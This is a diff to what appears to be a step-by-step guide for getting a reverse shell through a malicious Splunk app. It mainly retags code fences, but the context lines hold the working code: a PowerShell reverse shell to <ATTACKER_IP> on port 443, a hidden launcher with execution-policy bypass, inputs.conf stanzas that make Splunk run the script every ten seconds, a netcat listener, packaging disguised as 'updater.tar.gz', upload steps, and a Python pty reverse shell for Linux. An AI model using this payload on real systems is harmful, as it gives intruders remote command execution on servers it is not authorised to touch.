@@ -99,7 +99,7 @@ splunk_shell/
 └── default/
     └── inputs.conf   ← tells Splunk to run the script
 ```
-```
+```powershell
 // Step 2 — Create run.ps1 (PowerShell reverse shell)
 $client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>', 443)
 $stream = $client.GetStream()
@@ -114,13 +114,13 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 }
 $client.Close()
 ```
-```
+```powershell
 // Step 3 — Create run.bat (launcher for PowerShell)
 @ECHO OFF
 PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
 Exit
 ```
-```
+```powershell
 // Step 4 — Create inputs.conf
 
 # splunk_shell/default/inputs.conf
@@ -129,15 +129,15 @@ disabled = 0
 sourcetype = shell
 interval = 10
 ```
-```
+```powershell
 // Step 5 — Package the app
 tar -cvzf updater.tar.gz splunk_shell/
 ```
-```
+```powershell
 // Step 6 — Start your listener
 sudo nc -lnvp 443
 ```
-```
+```powershell
 // Step 7 — Upload via Splunk Web
 Splunk Web → Settings → Apps → Install app from file → Browse → updater.tar.gz → Upload
 
@@ -155,13 +155,15 @@ s = socket.socket()
 s.connect((ip, int(port)))
 [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
 pty.spawn('/bin/bash')
-
+```
+```powershell
 // Step 2 - inputs.conf for Linux
 [script://./bin/rev.py]
 disabled = 0
 interval = 10
 sourcetype = shell
-
+```
+```powershell
 // Step 3 - Package the app
 tar -cvzf updater.tar.gz splunk_shell/
 ```
